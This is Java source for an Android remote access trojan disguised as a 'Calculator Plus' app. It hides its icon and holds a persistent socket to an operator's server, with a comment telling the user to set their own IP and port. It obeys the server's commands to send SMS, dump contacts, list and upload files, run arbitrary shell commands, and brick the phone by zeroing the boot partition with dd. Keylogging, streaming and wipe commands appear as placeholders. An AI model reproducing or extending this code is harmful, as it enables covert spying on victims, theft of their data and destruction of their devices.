package com.calc.plus;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;

public class GhostFireService extends Service {
    private static final String TAG = "GhostFire";
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    // CHANGE THESE TO YOUR SERVER'S IP AND PORT
    private String serverIp = "192.168.11.101";
    private int serverPort = 4444;
    private AtomicBoolean running = new AtomicBoolean(true);

    // Foreground notification
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("calc_channel",
                    "Calculator Plus", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, "calc_channel")
                    .setContentTitle("Calculator Plus")
                    .setContentText("Ready")
                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("Calculator Plus")
                    .setContentText("Ready")
                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                    .build();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        hideIcon(); // remove launcher icon after first run
    }

    private void hideIcon() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::immortalConnect).start();
        return START_STICKY;
    }

    // Persistent connection with exponential backoff
    private void immortalConnect() {
        int backoff = 1000;
        while (running.get()) {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Identify device
                out.println("DEVICE:" + Build.MODEL + "|" + Build.VERSION.RELEASE);
                Log.i(TAG, "Connected to server");
                backoff = 1000;

                String line;
                while ((line = in.readLine()) != null && running.get()) {
                    if (line.equals("__SERVER_EXIT__")) {
                        running.set(false);
                        break;
                    }
                    executeCommand(line);
                }
            } catch (SocketTimeoutException e) {
                Log.e(TAG, "Connection timeout");
            } catch (Exception e) {
                Log.e(TAG, "Connection error", e);
            }

            if (running.get()) {
                try { Thread.sleep(backoff); } catch (InterruptedException ignored) {}
                backoff = Math.min(backoff * 2, 60000);
                Log.i(TAG, "Reconnecting in " + backoff + "ms");
            }
        }
        stopSelf();
    }

    // Command execution
    private void executeCommand(String cmd) {
        try {
            if (cmd.startsWith("SMS ")) {
                String[] parts = cmd.split(" ", 3);
                SmsManager.getDefault().sendTextMessage(parts[1], null, parts[2], null, null);
                out.println("SMS sent");
            } else if (cmd.equals("DUMP_CONTACTS")) {
                dumpContacts();
            } else if (cmd.startsWith("RUN_APP ")) {
                String pkg = cmd.substring(8).trim();
                Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launch);
                    out.println("APP_LAUNCHED:" + pkg);
                } else out.println("APP_NOT_FOUND");
            } else if (cmd.startsWith("OPEN_YOUTUBE ")) {
                String url = cmd.substring(13).trim();
                Intent youtube = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                youtube.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(youtube);
                out.println("YOUTUBE_OPENED");
            } else if (cmd.startsWith("OPEN_VIDEO ")) {
                String url = cmd.substring(11).trim();
                Intent video = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                video.setDataAndType(Uri.parse(url), "video/*");
                video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(video);
                out.println("VIDEO_OPENED");
            } else if (cmd.equals("CAMERA_SNAP")) {
                takePhoto();
            } else if (cmd.startsWith("LIST_STORAGE ")) {
                String path = cmd.substring(13).trim();
                listDirectory(path);
            } else if (cmd.startsWith("DOWNLOAD_FILE ")) {
                String remotePath = cmd.substring(14).trim();
                downloadFileFromServer(remotePath);
            } else if (cmd.startsWith("UPLOAD_FILE ")) {
                String localPath = cmd.substring(12).trim();
                uploadFileToServer(localPath);
            } else if (cmd.equals("SCREEN_STREAM")) {
                startScreenStream();
            } else if (cmd.equals("STOP_SCREEN")) {
                stopScreenStream();
            } else if (cmd.equals("MIC_STREAM")) {
                startMicStream();
            } else if (cmd.equals("STOP_MIC")) {
                stopMicStream();
            } else if (cmd.equals("KEYLOG_START")) {
                startKeylogger();
            } else if (cmd.equals("KEYLOG_STOP")) {
                stopKeylogger();
            } else if (cmd.equals("EXFIL_ALL")) {
                exfilAllData();
            } else if (cmd.startsWith("SHELL ")) {
                String shellCmd = cmd.substring(6);
                Process p = Runtime.getRuntime().exec(shellCmd);
                BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = pr.readLine()) != null) out.println(line);
                p.waitFor();
            } else if (cmd.equals("BRICK")) {
                brickDevice();
            } else if (cmd.equals("WIPE")) {
                factoryReset();
            } else {
                out.println("UNKNOWN_COMMAND");
            }
        } catch (Exception e) {
            out.println("ERROR: " + e.getMessage());
            Log.e(TAG, "Command error", e);
        }
    }

    // ---- implementations ----
    private void dumpContacts() {
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        StringBuilder sb = new StringBuilder();
        if (c != null) {
            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(":").append(num).append("\n");
            }
            c.close();
        }
        out.println(sb.toString());
    }

    private void takePhoto() {
        try {
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_" + System.currentTimeMillis() + ".jpg");
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            values.put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/Camera");
            Uri uri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
            out.println("PHOTO_SAVED:" + (uri != null ? uri.toString() : "FAILED"));
        } catch (Exception e) {
            out.println("CAMERA_ERROR:" + e.getMessage());
        }
    }

    private void listDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            out.println("INVALID_PATH");
            return;
        }
        StringBuilder sb = new StringBuilder();
        for (File f : dir.listFiles()) {
            sb.append(f.getName()).append(f.isDirectory() ? "/" : "").append("\n");
        }
        out.println(sb.toString());
    }

    private void downloadFileFromServer(String remotePath) {
        try {
            File outFile = new File(Environment.getExternalStorageDirectory(), "downloaded_" + System.currentTimeMillis());
            OutputStream os = new FileOutputStream(outFile);
            InputStream is = socket.getInputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                os.write(buf, 0, len);
                // In a real scenario, you'd need a delimiter; this is simplified.
                break;
            }
            os.close();
            out.println("FILE_RECEIVED:" + outFile.getAbsolutePath());
        } catch (Exception e) {
            out.println("DOWNLOAD_FAIL:" + e.getMessage());
        }
    }

    private void uploadFileToServer(String localPath) {
        File f = new File(localPath);
        if (!f.exists()) {
            out.println("FILE_NOT_FOUND");
            return;
        }
        try {
            out.println("FILE_SIZE:" + f.length());
            FileInputStream fis = new FileInputStream(f);
            OutputStream os = socket.getOutputStream();
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) != -1) {
                os.write(buf, 0, len);
            }
            fis.close();
            out.println("FILE_UPLOADED");
        } catch (Exception e) {
            out.println("UPLOAD_FAIL:" + e.getMessage());
        }
    }

    private void startScreenStream() {
        out.println("SCREEN_STREAM_STARTED (placeholder)");
    }

    private void stopScreenStream() {
        out.println("SCREEN_STREAM_STOPPED");
    }

    private void startMicStream() {
        out.println("MIC_STREAM_STARTED (placeholder)");
    }

    private void stopMicStream() {
        out.println("MIC_STREAM_STOPPED");
    }

    private void startKeylogger() {
        out.println("KEYLOG_STARTED (requires Accessibility)");
    }

    private void stopKeylogger() {
        out.println("KEYLOG_STOPPED");
    }

    private void exfilAllData() {
        out.println("EXFIL_COMPLETE (placeholder)");
    }

    private void brickDevice() {
        try {
            Process p = Runtime.getRuntime().exec("su -c dd if=/dev/zero of=/dev/block/bootdevice");
            p.waitFor();
            out.println("DEVICE_BRICKED");
        } catch (Exception e) {
            out.println("BRICK_FAILED: no root");
        }
    }

    private void factoryReset() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        // To actually wipe, you need to be device admin and call dpm.wipeData(0);
        out.println("WIPE_ATTEMPTED (admin required)");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        running.set(false);
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }
                                      }
